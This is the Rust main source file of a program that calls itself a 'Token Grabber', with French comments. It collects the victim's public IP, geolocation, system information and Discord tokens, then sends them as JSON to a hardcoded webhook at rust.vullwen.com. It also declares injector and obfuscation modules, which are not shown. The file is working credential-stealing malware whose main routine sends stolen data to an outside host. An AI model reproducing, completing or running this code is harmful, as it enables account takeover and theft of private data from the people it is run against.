mod exfiltrator;
mod extractor;
mod injector;
mod obfuscation;
mod utils;

use exfiltrator::Exfiltrator;
use extractor::Extractor;
use injector::Injector;
use serde_json::json;
use utils::{get_geolocation, get_public_ip, get_system_info, get_timestamp};

#[tokio::main]
async fn main() {
    println!("Token Grabber en Rust");

    println!("Test ip:");
    let ip = match get_public_ip().await {
        Ok(Some(ip_str)) => {
            println!("IP publique : {}", ip_str);
            ip_str
        }
        Ok(None) => {
            eprintln!("Impossible de récupérer l'IP publique");
            return;
        }
        Err(e) => {
            eprintln!("Erreur lors de la récupération de l'IP : {}", e);
            return;
        }
    };
    println!("Géolocalisation de l’IP :");
    if let Some((city, country)) = get_geolocation(&ip).await {
        println!("IP {} → {}, {}", ip, city, country);
    } else {
        eprintln!("Impossible de géolocaliser l’IP {}", ip);
    }

    //Init
    let injector = Injector::new();
    let extractor = Extractor::new();
    let webhook_url = "https://rust.vullwen.com/webhook.php";
    let exfiltrator = Exfiltrator::new(webhook_url);

    let mut entries = Vec::new();

    let tokens = extractor.extract_discord_tokens();
    let sys_info = get_system_info();
    let ts = get_timestamp();
    let location = match get_geolocation(&ip).await {
        Some((city, country)) => format!("{}, {}", city, country),
        None => String::from("Unknown"),
    };

    // Préparation de la structure serialisable
    let data = json!({
        "ip": ip,
        "location": location,
        "tokens":tokens,
        "system_info": sys_info,
        "timestamp": ts
    });
    entries.push(data);

    // 5. Envoi
    if let Err(err) = run_token_grabber(&exfiltrator, entries).await {
        eprintln!("Erreur lors de l’exécution : {}", err);
    } else {
        println!("Tokens Discord extraits :");
        for token in &tokens {
            println!("  {}", token);
        }
    }
}

async fn run_token_grabber(
    exfiltrator: &Exfiltrator,
    entries: Vec<serde_json::Value>,
) -> Result<(), String> {
    for entry in entries.into_iter() {
        println!("Traitement de l’entrée au timestamp {}", entry["timestamp"]);

        let data_struct: extractor::ExtractedData = serde_json::from_value(entry.clone())
            .map_err(|e| format!("Conversion JSON en ExtractedData : {}", e))?;

        exfiltrator.send_data(&data_struct).await?;
    }
    Ok(())
}
